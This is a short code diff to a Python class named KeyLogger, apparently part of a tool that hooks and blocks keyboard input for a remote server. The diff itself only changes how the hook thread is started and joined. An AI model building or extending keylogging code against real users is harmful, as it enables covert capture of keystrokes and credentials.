@@ -6,6 +6,7 @@ class KeyLogger:
     def __init__(self, server):
         self.server = server
         self.hooker = Hooker()
+        self.thread = None
 
     def start_listening(self, s):
         dict = {
@@ -23,7 +24,8 @@ class KeyLogger:
         return False
 
     def hook_keys(self):
-        threading.Thread(target=self.hooker.start, daemon=True).start()
+        self.thread = threading.Thread(target=self.hooker.start)
+        self.thread.start()
 
         while self.hooker.is_hooked is None:
             pass
@@ -58,3 +60,7 @@ class KeyLogger:
         finally:
             self.unhook_keys()
             self.unblock_keys()
+
+        if self.thread:
+            self.thread.join()
+            self.thread = None
